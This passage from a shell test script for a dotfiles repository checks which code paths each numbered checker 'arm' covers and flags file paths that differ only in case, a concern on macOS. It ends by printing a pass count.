  esac
done <<<"$cls_arm1"
ok
cls_n1=0
while IFS= read -r p; do
  [ -n "$p" ] || continue
  case "$p" in zsh/plugins/* | tests/*) continue ;; esac
  if _cls_under "$p" "$cls_arm2" || _cls_under "$p" "$cls_arm8" \
      || _cls_under "$p" .github; then
    _cls_under "$p" "$cls_arm1" \
      || fail "surface coverage: code path '$p' is on an arm 2 or arm 8 root, or in .github/, but on no arm 1 root"
    cls_n1=$((cls_n1 + 1))
  fi
done <<<"$cls_paths"
[ "$cls_n1" -gt 0 ] && ok || fail "surface coverage: no code path was checked against arm 1's roots"
# arms 13 and 14 read a fixed surface each, derived from the same log: arm 13
# exactly install.sh and lib/, arm 14 exactly the tracked entries of zsh/ but the pinned
# zsh/plugins (a narrower or wider root is a surface change to review).
[ "$cls_arm13" = "install.sh"$'\n'"lib"$'\n' ] && ok \
  || fail "surface coverage: arm 13 (raw readlink) must read exactly install.sh and lib/, got: $cls_arm13"
cls_zsh_want="$(printf '%s' "$cls_paths" | sed -n -e '/^zsh\/plugins\//d' -e 's|^\(zsh/[^/]*\).*|\1|p' | LC_ALL=C sort -u)"
cls_zsh_got="$(printf '%s' "$cls_arm14" | LC_ALL=C sort -u)"
[ -n "$cls_zsh_want" ] && [ "$cls_zsh_got" = "$cls_zsh_want" ] && ok \
  || fail "surface coverage: arm 14 (tied path) must read exactly zsh/'s tracked entries but zsh/plugins; want: $cls_zsh_want; got: $cls_zsh_got"

# --- no two paths anywhere under $work may differ only in case: macOS's
# default filesystem folds case, so they would be ONE path there and the
# second fixture (or file) would land on the first one's. Checked here, so a
# case-sensitive Linux run catches it too. Line-oriented: a name holding a
# newline splits into two lines here, so each such fixture name is chosen
# to leave both halves unique, or removed before this check ----------------
case_dups="$(cd "$work" && find . | tr '[:upper:]' '[:lower:]' | LC_ALL=C sort | uniq -d)"
[ -z "$case_dups" ] && ok \
  || fail "paths under \$work that differ only in case (one path on macOS): $case_dups"

echo "PASS: check_patterns_test ($pass assertions)"
